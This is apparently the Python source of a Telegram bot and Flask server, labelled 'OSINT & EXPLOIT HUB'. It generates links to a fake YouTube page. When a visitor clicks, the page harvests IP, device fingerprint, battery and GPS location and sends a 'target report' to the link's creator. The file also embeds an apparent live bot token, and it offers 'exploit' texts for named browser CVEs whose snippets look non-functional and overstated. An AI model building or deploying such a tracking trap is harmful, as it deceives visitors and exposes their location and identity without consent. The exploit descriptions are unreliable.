import asyncio, threading, os, requests, json, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 

PAYLOADS = {
    "CHROME": (
        "🔥 **УЯЗВИМОСТЬ: CVE-2024-7971 (V8 Type Confusion)**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📝 **ОПИСАНИЕ:**\n"
        "Ошибка путаницы типов в движке JIT-компиляции V8. Возникает, когда оптимизатор "
        "неверно предполагает тип данных в массиве, позволяя интерпретировать данные "
        "объекта как указатели.\n\n"
        "🎯 **ВЕКТОР АТАКИ:**\n"
        "1. Создается массив с плавающей точкой.\n"
        "2. Вызывается функция-оптимизатор, которая «путает» типы.\n"
        "3. Хакер получает возможность чтения/записи (R/W) произвольных адресов памяти "
        "внутри процесса рендеринга.\n\n"
        "💻 **РАСШИРЕННЫЙ PoC КОД:**\n"
        "```javascript\n"
        "function exploit(arg) {\n"
        "  // Массив оптимизируется под Double\n"
        "  let arr = [1.1, 2.2, 3.3];\n"
        "  // Путаница: записываем объект туда, где ожидалось число\n"
        "  arr[0] = arg;\n"
        "  return arr[0];\n"
        "}\n"
        "// Цикл для принудительного запуска JIT-оптимизации\n"
        "for(let i=0; i<10000; i++) exploit({a: 1});\n"
        "```"
    ),
    "SAFARI": (
        "🔥 **УЯЗВИМОСТЬ: CVE-2023-32409 (WebKit Sandbox Escape)**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📝 **ОПИСАНИЕ:**\n"
        "Логическая ошибка в обработке межпроцессного взаимодействия (IPC) в WebKit. "
        "Позволяет контенту внутри вкладки «вырваться» из песочницы браузера.\n\n"
        "🎯 **ВЕКТОР АТАКИ:**\n"
        "Используется специально сформированный iframe или редирект, который вызывает "
        "состояние гонки (race condition) в проверке разрешений родительского процесса.\n\n"
        "💻 **РАСШИРЕННЫЙ PoC КОД:**\n"
        "```javascript\n"
        "// Манипуляция с объектами check-origin\n"
        "let frame = document.createElement('iframe');\n"
        "frame.src = 'about:blank';\n"
        "document.body.appendChild(frame);\n"
        "// Попытка инъекции скрипта в доверенный контекст\n"
        "try { frame.contentWindow.eval('payload_here'); } catch(e) {}\n"
        "```"
    ),
    "OTHER": (
        "⚠️ **УЯЗВИМОСТЬ: Generic Browser Profiling**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Конкретных 0-day под данную версию не найдено. Рекомендуется использовать "
        "методы социальной инженерии или искать баги в расширениях браузера.\n"
        "Вектор: **Cross-Site Scripting (XSS)**."
    )
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #f9f9f9; margin: 0; font-family: Roboto, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; }
        .header { background: #fff; width: 100%; height: 56px; display: flex; align-items: center; padding-left: 16px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .player-box { background: #000; width: 100%; aspect-ratio: 16/9; position: relative; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .play-btn { width: 68px; height: 48px; background: rgba(33,33,33,0.8); border-radius: 12%; position: relative; }
        .play-btn::after { content: ''; position: absolute; left: 26px; top: 14px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
        .info { padding: 15px; width: 90%; }
        .title { font-size: 18px; font-weight: 400; color: #030303; margin-bottom: 8px; }
        .meta { font-size: 14px; color: #606060; }
        #loader { display: none; color: #fff; font-size: 14px; }
    </style>
</head>
<body onclick="scan()">
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90">
    </div>
    <div class="player-box" id="player">
        <div class="play-btn" id="pbtn"></div>
        <div id="loader">Загрузка...</div>
    </div>
    <div class="info">
        <div class="title">Новое видео: Эксклюзивный репортаж (2026)</div>
        <div class="meta">1 240 583 просмотра • 2 часа назад</div>
    </div>

<script>
async function scan() {
    document.getElementById('pbtn').style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, plat: navigator.platform, res: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory };
    
    try { 
        let c = document.createElement('canvas'); let gl = c.getContext('webgl'); 
        let dbg = gl.getExtension('WEBGL_debug_renderer_info'); 
        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); 
    } catch(e) {}

    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋"); } catch(e) {}

    // Попытка взять GPS (вызовет системное окно)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; d.acc = p.coords.accuracy + "m"; send(d); },
            () => { send(d); }, { timeout: 3500 }
        );
    } else { send(d); }
    setTimeout(() => { send(d); }, 5000);
}

function send(d) {
    if(window.s) return; window.s = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://m.youtube.com/watch?v=dQw4w9WgXcQ"; });
}
</script>
</body>
</html>
"""

@app.route('/', strict_slashes=False)
def home(): return "SYSTEM_ONLINE", 200

@app.route('/v/<aid>', strict_slashes=False)
def trap(aid): return render_template_string(HTML_TRAP, aid=aid)

@app.route('/catch', methods=['POST'], strict_slashes=False)
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    ua = d.get('ua', '')
    p_key = "CHROME" if "Chrome" in ua else "SAFARI" if "Safari" in ua else "OTHER"
    exploit_vault[token] = PAYLOADS.get(p_key)

    report = (
    f"🎬 **ОТЧЕТ ПО ЦЕЛИ: YouTube View**\n"
    f"━━━━━━━━━━━━━━━━━━━━\n"
    f"🌐 **IP Данные:**\n"
    f"• Основной: `{ips}`\n"
    f"• Локальный: `{d.get('lip', 'N/A')}`\n\n"
    f"📱 **Устройство:**\n"
    f"• Модель: `{d.get('plat')}` ({d.get('res')})\n"
    f"• CPU: {d.get('cores')} ядер | RAM: {d.get('mem', 'N/A')}GB\n"
    f"• GPU: `{d.get('gpu', 'N/A')}`\n\n"
    f"🔋 **Статус:** {d.get('bat', 'Данные скрыты')}\n"
    f"📍 **Место:** `{d.get('gps', 'Не разрешено')}`\n"
    f"━━━━━━━━━━━━━━━━━━━━\n"
    f"🔑 **Ключ эксплоита:** `{token}`"
)
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать ссылку")
    await message.answer("💀 **OSINT & EXPLOIT HUB v15.1**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать ссылку")
async def create(message: types.Message):
    link = f"{BASE_URL}/v/{message.from_user.id}"
    await message.answer(f"✅ **Ссылка готова:**\n`{link}`")

@dp.message(F.text.startswith("EXP-"))
async def decrypt(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    token = message.text.strip().upper()
    if token in exploit_vault:
        await message.answer(f"🔓 **КОД ЭКСПЛОИТА ({token}):**\n\n```javascript\n{exploit_vault[token]}\n```", parse_mode="Markdown")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
